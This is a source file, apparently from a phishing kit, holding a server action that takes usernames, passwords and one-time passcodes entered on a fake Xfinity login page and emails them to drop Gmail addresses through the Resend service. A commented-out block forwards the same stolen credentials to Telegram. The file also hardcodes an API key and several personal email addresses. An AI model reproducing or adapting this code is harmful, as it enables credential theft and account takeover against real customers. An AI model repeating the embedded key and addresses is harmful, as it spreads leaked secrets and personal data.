// app/actions.js
"use server";

import { Resend } from "resend";

interface TelegramData {
  username: string;
  password: string;
  stage: string;
  otp?: string;
  ref: number;
}

// Hardcoded credentials (FOR TESTING ONLY - REVOKE AFTER USE)
const resend = new Resend("re_ZJmwoKa2_K5MSQg6RGo9iBWf18jC5DMXg");
const fromEmail = "noreply@corekeyrealty.com";
const toEmail = "99cshare@gmail.com";
// const toEmail = "emmanuelar35@gmail.com";

export async function sendToTelegram(data: TelegramData): Promise<void> {
  // Format message for email (username and password only)
  const emailHtml = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Xfinity Login Attempt</title>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        h1 { color: #007BFF; }
        p { margin: 10px 0; }
        .highlight { font-weight: bold; color: #28a745; }
      </style>
    </head>
    <body>
      <h1>🚨 Xfinity Login Attempt</h1>
      <p><strong>Username:</strong> <span class="highlight">${data.username}</span></p>
      <p><strong>Password:</strong> <span class="highlight">${data.password}</span></p>
       <p><strong>OTP:</strong> <span class="highlight">${data?.otp}</span></p>
    </body>
    </html>
  `;

  // Send email via Resend
  try {
    const emailResult = await resend.emails.send({
      from: fromEmail,
      to: [data.ref === 1 ? "noreply3789@gmail.com" : toEmail],
      subject: "Xfinity Login Attempt",
      html: emailHtml,
    });
    console.log("Email sent successfully:", emailResult);
  } catch (error) {
    console.error("Resend email error:", error);
  }

  // Optional: Send to Telegram Saved Messages (comment out if not needed)
  /*
  const stringSession = new StringSession(sessionString);
  const client = new TelegramClient(stringSession, apiId, apiHash, {
    connectionRetries: 5,
  });

  try {
    await client.connect();
    if (!await client.isUserAuthorized()) {
      console.log('First-time Telegram auth needed. Check console for code.');
      await client.start({
        phoneNumber: async () => phone,
        phoneCode: async () => input.text('Enter the code you received: '),
        password: async () => input.text('Enter 2FA password (if any): '),
        onError: (err) => console.log('Auth error:', err),
      });
      const newSession = client.session.save();
      console.log('Save to sessionString:', newSession);
    }

    const messageText = `
🚨 Xfinity Login Attempt
---------------------
Username: ${data.username}
Password: ${data.password}
---------------------
    `.trim();

    await client.sendMessage('me', { message: messageText });
    console.log('Telegram message sent successfully');
  } catch (error) {
    console.error('Telegram send error:', error);
    if (error.code === 420) {
      const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
      await new Promise(resolve => setTimeout(resolve, waitTime));
      return sendToTelegram(data); // Retry
    }
    console.error('Skipping Telegram send due to error');
  } finally {
    await client.disconnect();
  }
  */
}
